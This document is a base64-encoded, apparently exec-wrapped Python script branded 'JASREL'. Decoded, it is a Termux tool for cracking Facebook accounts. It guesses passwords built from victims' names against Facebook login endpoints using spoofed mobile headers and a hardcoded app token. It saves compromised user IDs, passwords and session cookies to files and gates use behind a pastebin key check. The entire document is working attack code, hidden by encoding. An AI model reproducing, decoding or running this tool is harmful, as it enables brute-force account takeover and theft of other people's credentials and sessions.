TIwIicsCiAgICAgICAgICAgICAgICAgICAgJ3NlYy1jaC11YS1mdWxsLXZlcnNpb24tbGlzdCc6ICciTm90X0EgQnJhbmQiO3Y9IjguMC4wLjAiLCAiQ2hyb21pdW0iO3Y9IjEyMC4wLjYwOTkuMjAiJywKICAgICAgICAgICAgICAgICAgICAnc2VjLWNoLXVhLW1vYmlsZSc6ICc/MScsCiAgICAgICAgICAgICAgICAgICAgIydzZWMtY2gtdWEtbW9kZWwnOiBmJyJ7bW9kZWxzc3N9IicsCiAgICAgICAgICAgICAgICAgICAgJ3NlYy1jaC11YS1wbGF0Zm9ybSc6IGYnIkFuZHJvaWQiJywKICAgICAgICAgICAgICAgICAgICAjJ3NlYy1jaC11YS1wbGF0Zm9ybS12ZXJzaW9uJzogZicie3JhbmRvbS5yYW5kaW50KDQsMTMpfXtyYW5kb20uY2hvaWNlKFsiIiwiLjAuMCIsIi4wIiwiLjEuMiIsIi4wLjEiLCIiLCIiLCIiLCIuMC4yIl0pfSInLAogICAgICAgICAgICAgICAgICAgICdzZWMtZmV0Y2gtZGVzdCc6ICdkb2N1bWVudCcsCiAgICAgICAgICAgICAgICAgICAgJ3NlYy1mZXRjaC1tb2RlJzogJ25hdmlnYXRlJywKICAgICAgICAgICAgICAgICAgICAnc2VjLWZldGNoLXNpdGUnOiAnc2FtZS1vcmlnaW4nLAogICAgICAgICAgICAgICAgICAgICdzZWMtZmV0Y2gtdXNlcic6ICc/MScsCiAgICAgICAgICAgICAgICAgICAgJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOiAnMScsCiAgICAgICAgICAgICAgICAgICAgJ3VzZXItYWdlbnQnOiBjY2MsCiAgICAgICAgICAgICAgICAgICAgJ3ZpZXdwb3J0LXdpZHRoJzogJzk4MCcsCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICBnZXRsb2c9c2Vzc2lvbi5nZXQoZiJodHRwczovL2ZyZWUuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9wYXNzd29yZC8/dWlkPXtpZHN9JmZsb3c9bG9naW5fbm9fcGluJnJlZnNyYz1kZXByZWNhdGVkJl9yZHIiKQogICAgICAgICAgICBkYXRhPXsKICAgICAgICAgICAgICAgICAgICAibHNkIjpyZS5zZWFyY2goJ25hbWU9ImxzZCIgdmFsdWU9IiguKj8pIicsIHN0cihnZXRsb2cudGV4dCkpLmdyb3VwKDEpLAogICAgICAgICAgICAgICAgICAgICJqYXpvZXN0IjpyZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIoZ2V0bG9nLnRleHQpKS5ncm91cCgxKSwKICAgICAgICAgICAgICAgICAgICAidWlkIjppZHMsCiAgICAgICAgICAgICAgICAgICAgIm5leHQiOiJodHRwczovL2ZyZWUuZmFjZWJvb2suY29tL2xvZ2luL3NhdmUtZGV2aWNlLyIsCiAgICAgICAgICAgICAgICAgICAgImZsb3ciOiJsb2dpbl9ub19waW4iLAogICAgICAgICAgICAgICAgICAgICJwYXNzIjpwYXMsCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIGNvbXAgPSBzZXNzaW9uLnBvc3QoImh0dHBzOi8vZnJlZS5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3ZhbGlkYXRlLXBhc3N3b3JkLz9zaGJsPTAiLGhlYWRlcnM9aGVhZGVycyxkYXRhPWRhdGEpCiAgICAgICAgICAgIGV4Yz1zZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5rZXlzKCkKICAgICAgICAgICAgY29va2llPSI7Ii5qb2luKFtrZXkrIj0iK3ZhbHVlIGZvciBrZXksdmFsdWUgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pCiAgICAgICAgICAgIGlmICJjX3VzZXIiIGluIGV4YzoKICAgICAgICAgICAgICAgIHJwcmludCgiIFtib2xkIGdyZWVuXVxuW09LXSBVU0VSSUQ6IFtib2xkIGN5YW5dJXNcbltib2xkIGdyZWVuXSBQQVNTOiBbYm9sZCBjeWFuXSVzXG4gW2JvbGQgZ3JlZW5dREFURTogJXNcbiBbYm9sZCBncmVlbl1DT09LSUVTOiBbYm9sZCBjeWFuXSVzWy9dIiUoaWRzLHBhcyxqb2luZWQoaWRzKSxjb29raWUpKQogICAgICAgICAgICAgICAgb2tzLmFwcGVuZChpZHMpCiAgICAgICAgICAgICAgICBvcGVuKCIvc2RjYXJkL2phc3JlbC1vay50eHQiLCJhIikud3JpdGUoaWRzKyIgfCAiK3BhcysiIHwgIitjb29raWUpCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbGlmICJjaGVja3BvaW50IiBpbiBleGM6CiAgICAgICAgICAgICAgICBjcHMuYXBwZW5kKGlkcykKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbi5Db25uZWN0aW9uRXJyb3I6CiAgICAgICAgc3AoMTApCiAgICBsb29wKz0xCmRlZiBtMihpZHMsbmFtZXMscGFzc2xpc3QpOgogICAgZ2xvYmFsIG9rcyxsb29wCiAgICB0cnk6CiAgICAgICAgZm49bmFtZXMuc3BsaXQoJyAnKVswXQogICAgICAgIHRyeToKICAgICAgICAgICAgbG49bmFtZXMuc3BsaXQoJyAnKVsxXQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgbG49Zm4KICAgICAgICBmb3IgcHcgaW4gcGFzc2xpc3Q6CiAgICAgICAgICAgIHN5cy5zdGRvdXQud3JpdGUoIlxyXHJcMDMzWzE7MzZtIEpBU1JFTFwwMzNbMTszNW0oXDAzM1sxOzM3bSVzXDAzM1sxOzM1bSkgXDAzM1sxOzMybU9LPiVzIFwwMzNbMTszMW1DUD4lcyIlKGxvb3AsbGVuKG9rcyksbGVuKGNwcykpKTtzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICAgICAgcGFzPXB3LnJlcGxhY2UoJ2ZpcnN0Jyxmbi5sb3dlcigpKS5yZXBsYWNlKCdGaXJzdCcsZm4pLnJlcGxhY2UoJ2xhc3QnLGxuLmxvd2VyKCkpLnJlcGxhY2UoJ0xhc3QnLGxuKS5yZXBsYWNlKCdOYW1lJyxuYW1lcykucmVwbGFjZSgnbmFtZScsbmFtZXMubG93ZXIoKSkKICAgICAgICAgICAgZGF0YT17CiAgICAgICAgICAgICAgJ2FkaWQnOiBmJ3t1dWlkLnV1aWQ0KCl9JywgCiAgICAgICAgICAgICAgJ2Zvcm1hdCc6ICdqc29uJywgCiAgICAgICAgICAgICAgJ2RldmljZV9pZCc6IGYne3V1aWQudXVpZDQoKX0nLCAKICAgICAgICAgICAgICAnY3BsJzogJ3RydWUnLCAKICAgICAgICAgICAgICAnZmFtaWx5X2RldmljZV9pZCc6IGYne3V1aWQudXVpZDQoKX0nLCAKICAgICAgICAgICAgICAnY3JlZGVudGlhbHNfdHlwZSc6ICdkZXZpY2VfYmFzZWRfbG9naW5fcGFzc3dvcmQnLCAKICAgICAgICAgICAgICAnZXJyb3JfZGV0YWlsX3R5cGUnOiAnYnV0dG9uX3dpdGhfZGlzYWJsZWQnLCAKICAgICAgICAgICAgICAnc291cmNlJzogJ2RldmljZV9iYXNlZF9sb2dpbicsIAogICAgICAgICAgICAgICdlbWFpbCc6IGlkcywgCiAgICAgICAgICAgICAgJ3Bhc3N3b3JkJzogcGFzLCAKICAgICAgICAgICAgICAnYWNjZXNzX3Rva2VuJzogJzM1MDY4NTUzMTcyOCU3QzYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJywgCiAgICAgICAgICAgICAgJ2dlbmVyYXRlX3Nlc3Npb25fY29va2llcyc6ICcxJywgCiAgICAgICAgICAgICAgJ21ldGFfaW5mX2ZibWV0YSc6ICcnLCAKICAgICAgICAgICAgICAnYWR2ZXJ0aXNlcl9pZCc6IGYne3V1aWQudXVpZDQoKX0nLCAKICAgICAgICAgICAgICAnY3VycmVudGx5X2xvZ2dlZF9pbl91c2VyaWQnOiAnMCcsIAogICAgICAgICAgICAgICdsb2NhbGUnOiAnZW5fVVMnLCAKICAgICAgICAgICAgICAnY2xpZW50X2NvdW50cnlfY29kZSc6ICcnLCAKICAgICAgICAgICAgICAnbWV0aG9kJzogJ2F1dGgubG9naW4nLCAKICAgICAgICAgICAgICAnZmJfYXBpX3JlcV9mcmllbmRseV9uYW1lJzogJ2F1dGhlbnRpY2F0ZScsIAogICAgICAgICAgICAgICdmYl9hcGlfY2FsbGVyX2NsYXNzJzogJ2NvbS5mYWNlYm9vay5hY2NvdW50LmxvZ2luLnByb3RvY29sLkZiNGFBdXRoSGFuZGxlcicsIAogICAgICAgICAgICAgICdhcGlfa2V5JzogZic2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMicKICAgICAgICAgICAgICAKICAgICAgICAgICAgfQogICAgICAgICAgICBidWlsZD1mIntyYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSl9e3JhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKX17cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pfXtyYW5kb20ucmFuZGludCgxMCw5OSl9e3JhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKX0iCiAgICAgICAgICAgIGZiYmIgPSByYW5kb20ucmFuZGludCgyMDAwMDAwMDAsMzAwMDAwMDAwKQogICAgICAgICAgICBmYm9iID0gcmFuZG9tLnJhbmRpbnQoMjAwMDAwMDAwLDMwMDAwMDAwMCkKICAgICAgICAgICAgcXAxYSA9IGYiUVAxQS57cmFuZG9tLnJhbmRpbnQoMTAwMDAwLDIwMDAwMCl9LjB7cmFuZG9tLnJhbmRpbnQoMTAsMjUpfSIKICAgICAgICAgICAgZmJwbm5uPXJhbmRvbS5jaG9pY2UoWydGQjRBJywnT3JjYS1BbmRyb2lkJywnTWVzc2VuZ2VyTGl0ZSddKQogICAgICAgICAgICBpZiBmYnBubm4gPT0gIkZCNEEiOgogICAgICAgICAgICAgIGZicG5uPSJrYXRhbmEiCiAgICAgICAgICAgIGVsaWYgZmJwbm5uID09ICJPcmNhLUFuZHJvaWQiOgogICAgICAgICAgICAgIGZicG5uPSJvcmNhIgogICAgICAgICAgICBlbGlmIGZicG5ubiA9PSAiTWVzc2VuZ2VyTGl0ZSI6CiAgICAgICAgICAgICAgZmJwbm49Im1saXRlIgogICAgICAgICAgICBidWlsbGQgPSByYW5kb20uY2hvaWNlKFtidWlsZCxxcDFhXSkKICAgICAgICAgICAgZmJjY3I9cmFuZG9tLmNob2ljZShbJ1RNJywnR0xPQkUnXSkKICAgICAgICAgICAgaGVhZGVycz17CiAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiBmIltGQkFOL0ZCNEE7RkJBVi97cmFuZG9tLnJhbmRpbnQoMTAwLDMwMCl9LjAuMC57cmFuZG9tLnJhbmRpbnQoMTAsMjApfS57cmFuZG9tLnJhbmRpbnQoODAsMTUwKX07RkJCVi97cmFuZG9tLnJhbmRpbnQoMjAwMDAwMDAsODAwMDAwMDApfTtbRkJBTi97ZmJwbm5ufTtGQkFWL3tyYW5kb20ucmFuZGludCgxMDAsMzAwKX0uMC4wLntyYW5kb20ucmFuZGludCgxMCwyMCl9LntyYW5kb20ucmFuZGludCg4MCwxNTApfSIrIjtGQkJWLzIiK3N0cihyYW5kb20ucmFuZGludCgxMDAwMDAwLDk5OTk5OTkpKSsiO0ZCRE0ve2RlbnNpdHk9My4wLHdpZHRoPTEwODAsaGVpZ2h0PTE5MjB9O0ZCTEMvZW5fVVM7RkJSVi8wO0ZCQ1IvVE07RkJNRi9PUFBPO0ZCQkQvT1BQTztGQlBOL2NvbS5mYWNlYm9vay4lcztGQkRWL0NQSDIyMDM7RkJTVi82LjA7RkJDQS9hcm1lYWJpLXY3YTphcm1lYWJpO10iJShmYnBubikrZiIgW0ZCQU4vRkI0QTtGQkFWL3tyYW5kb20ucmFuZGludCgxMDAsMzAwKX0uMC4wLntyYW5kb20ucmFuZGludCgxMCwyMCl9LntyYW5kb20ucmFuZGludCg4MCwxNTApfTtGQkJWL3tyYW5kb20ucmFuZGludCgyMDAwMDAwMCw5OTk5OTk5OSl9O1tGQkFOL3tmYnBubm59O0ZCQVYve3JhbmRvbS5yYW5kaW50KDEwMCwzMDApfS4wLjAue3JhbmRvbS5yYW5kaW50KDEwLDIwKX0ue3JhbmRvbS5yYW5kaW50KDgwLDE1MCl9IisiO0ZCQlYvMiIrc3RyKHJhbmRvbS5yYW5kaW50KDEwMDAwMDAwLDk5OTk5OTk5KSkrIjtGQkRNL3tkZW5zaXR5PTMuMCx3aWR0aD0xMDgwLGhlaWdodD0xOTIwfTtGQkxDL2VuX1VTO0ZCUlYvMzMyMDA5ODIzO0ZCQ1IvR0xPQkU7RkJNRi9PUFBPO0ZCQkQvT1BQTztGQlBOL2NvbS5mYWNlYm9vay4lcztGQkRWL0NQSDIyMDM7RkJTVi82LjAuMTtGQkNBL2FybWVhYmktdjdhOmFybWVhYmk7XSIlKGZicG5uKStmIiBbRkJBTi9GQjRBO0ZCQVYve3JhbmRvbS5yYW5kaW50KDEwMCwzMDApfS4wLjAue3JhbmRvbS5yYW5kaW50KDEwLDIwKX0ue3JhbmRvbS5yYW5kaW50KDgwLDE1MCl9O0ZCQlYve3JhbmRvbS5yYW5kaW50KDIwMDAwMDAwLDk5OTk5OTk5KX07W0ZCQU4ve2ZicG5ubn07RkJBVi97cmFuZG9tLnJhbmRpbnQoMTAwLDMwMCl9LjAuMC57cmFuZG9tLnJhbmRpbnQoMTAsMjApfS57cmFuZG9tLnJhbmRpbnQoODAsMTUwKX0iKyI7RkJCVi8yIitzdHIocmFuZG9tLnJhbmRpbnQoMTAwMDAwMCw5OTk5OTk5KSkrIjtGQkRNL3tkZW5zaXR5PTMuMCx3aWR0aD0xMDgwLGhlaWdodD0xOTIwfTtGQkxDL2VuX1VTO0ZCQ1IvVE07RkJNRi9zYW1zdW5nO0ZCQkQvc2Ftc3VuZztGQlBOL2NvbS5mYWNlYm9vay4lcztGQkRWL1NNLUEzMDVHVDtGQlNWLzEwO0ZCQ0EvYXJtZWFiaS12N2E6YXJtZWFiaTtdIiUoZmJwbm4pLAogICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJywgCiAgICAgICAgICAgICAgJ0hvc3QnOiAnZ3JhcGguZmFjZWJvb2suY29tJywgCiAgICAgICAgICAgICAgJ1gtRkItTmV0LUhOSSc6IHN0cihyYW5kb20ucmFuZGludCgxMDAwMCw5OTk5OSkpLCAKICAgICAgICAgICAgICAnWC1GQi1TSU0tSE5JJzogc3RyKHJhbmRvbS5yYW5kaW50KDEwMDAwLDk5OTk5KSksIAogICAgICAgICAgICAgICdYLUZCLUNvbm5lY3Rpb24tVHlwZSc6ICdNT0JJTEUuTFRFJywKICAgICAgICAgICAgICAnWC1UaWdvbi1Jcy1SZXRyeSc6ICdGYWxzZScsCiAgICAgICAgICAgICAgJ3gtZmItc2Vzc2lvbi1pZCc6ICduaWQ9amlaK3lOTkJnYndDO3BpZD1NYWluO3RpZD0xMzI7bmM9MTtmYz0wO2JjPTA7Y2lkPTYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJywgCiAgICAgICAgICAgICAgJ3gtZmItZGV2aWNlLWdyb3VwJzogc3RyKHJhbmRvbS5yYW5kaW50KDEwMDAsOTk5OSkpLAogICAgICAgICAgICAgICdYLUZCLUZyaWVuZGx5LU5hbWUnOiAnVmlld2VyUmVhY3Rpb25zTXV0YXRpb24nLCAgCiAgICAgICAgICAgICAgJ1gtRkItUmVxdWVzdC1BbmFseXRpY3MtVGFncyc6ICdncmFwaHNlcnZpY2UnLCAKICAgICAgICAgICAgICAnWC1GQi1IVFRQLUVuZ2luZSc6ICdMaWdlcicsIAogICAgICAgICAgICAgICdYLUZCLUNsaWVudC1JUCc6ICdUcnVlJywgCiAgICAgICAgICAgICAgJ1gtRkItU2VydmVyLUNsdXN0ZXInOiAnVHJ1ZScsIAogICAgICAgICAgICAgICd4LWZiLWNvbm5lY3Rpb24tdG9rZW4nOiAnNjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInLAogICAgICAgICAgICAgIAogICAgICAgICAgICB9CiAgICAgICAgICAgIHVybD0naHR0cHM6Ly9iLWdyYXBoLmZhY2Vib29rLmNvbS9hdXRoL2xvZ2luJwogICAgICAgICAgICByZXE9cmVxdWVzdHMucG9zdCh1cmwsZGF0YT1kYXRhLGhlYWRlcnM9aGVhZGVycykuanNvbigpCiAgICAgICAgICAgIGlmICdzZXNzaW9uX2tleScgaW4gcmVxOgogICAgICAgICAgICAgICAgY29raSA9ICI7Ii5qb2luKGlbIm5hbWUiXSsiPSIraVsidmFsdWUiXSBmb3IgaSBpbiByZXFbInNlc3Npb25fY29va2llcyJdKQogICAgICAgICAgICAgICAgcHJpbnQoJ1xyXHIgXDAzM1sxOzMybVtMT0FEIERBVEFdICcraWRzKyd8JytwYXMpCiAgICAgICAgICAgICAgICBvcGVuKCcvc2RjYXJkL0pBU1JFTC1BTElWRS50eHQnLCdhJykud3JpdGUoaWRzKyd8JytwYXMrJ1xuJykKICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQvSkFTUkVMLUNPT0tJRVMudHh0JywnYScpLndyaXRlKGlkcysifCIrcGFzKyJ8Iitjb2tpKyJcbiIpCiAgICAgICAgICAgICAgICBva3MuYXBwZW5kKGlkcykKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHJlcVsnZXJyb3InXVsnbWVzc2FnZSddOgogICAgICAgICAgICAgICAgcHJpbnQoJ1xyXHJcMDMzWzE7MzFtIFtDSEVDS1BPSU5UXSAnK2lkcysnfCcrcGFzKQogICAgICAgICAgICAgICAgY3BzLmFwcGVuZChpZHMpCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICBsb29wKz0xCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwphaD0ieEQ0UkstIgppbXQ9Ii1NNDc4Nj09Igphaz0iIERSNFgtIgpteWlkPXV1aWQudXVpZDQoKS5oZXhbOjEwXS51cHBlcigpCgp0cnk6CiAga2V5MT1vcGVuKCcvZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvdXNyL2Jpbi8uZXhjYS50eHQnLCAncicpLnJlYWQoKQpleGNlcHQ6CiAga29rPW9wZW4oJy9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy91c3IvYmluLy5leGNhLnR4dCcsICd3JykKICBrb2sud3JpdGUobXlpZCtpbXQpCiAga29rLmNsb3NlKCkKYXN5bmMgZGVmIGtleSgpOgogICNyMT1zdHIodXJsb3BlbigiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3pnMEQ5TjdZIikucmVhZCgpKQogIGtleTE9b3BlbignL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL3Vzci9iaW4vLmV4Y2EudHh0JywgJ3InKS5yZWFkKCkKICBjbGVhcigpCiAgbG9nbygpCiAgYXN5bmMgd2l0aCBhaW9odHRwLkNsaWVudFNlc3Npb24oKSBhcyBzZXNzOgogICAgYXN5bmMgd2l0aCBzZXNzLmdldCgnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2huSFgySjhCJykgYXMgYXBwcm86CiAgICAgIHIxID0gYXdhaXQgYXBwcm8udGV4dCgpCiAgICAgIGlmIGtleTEgaW4gcjE6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcnByaW50KCJ7fVlvdXIgS2V5IElzIEFwcHJvdmVkWy9dIi5mb3JtYXQoZykpCiAgICAgICAgc3AoMykKICAgICAgICBtYWluKCkKICAgICAgZWxzZToKICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgICAgICBwcmludCgiXHQgXDAzM1sxOzMybSBGaXJzdCBHZXQgQXBwcm92YWxcMDMzWzE7MzdtICIpCiAgICAgICAgdGltZS5zbGVlcCg1KQogICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQogICAgICAgIGxvZ28oKQogICAgICAgIHByaW50ICgiIikKICAgICAgICBwcmludCgiIFlPVSBIQVZFIFRPIEdFVCBBUFBST1ZFIEZJUlNUIEJFRk9SRSBVU0lORyBJVCIpCiAgICAgICAgcHJpbnQgKCIiKQogICAgICAgIHByaW50KCIgWW91ciBLZXkgaXMgTm90IEFwcHJvdmVkICIpCiAgICAgICAgcHJpbnQoIiIpCiAgICAgICAgcHJpbnQgKCIgWW91ciBLZXkgOiAiK2FrK2FoK2tleTEgKQogICAgICAgIHByaW50ICgiIikKICAgICAgICBpbnB1dCgiIFByZXNzIEVudGVyIFRvIFNlbmQgS2V5IikKICAgICAgICB0aW1lLnNsZWVwKDMuNSkKICAgICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd3d3Lm1lc3Nlbmdlci5jb20vdC8xMDAwNjUzMTY0MTQ3MTMnKQojLS1lbmQtLQojCmFzeW5jaW8ucnVuKGxvZ2luKCkpCiNtYWluKCkK'))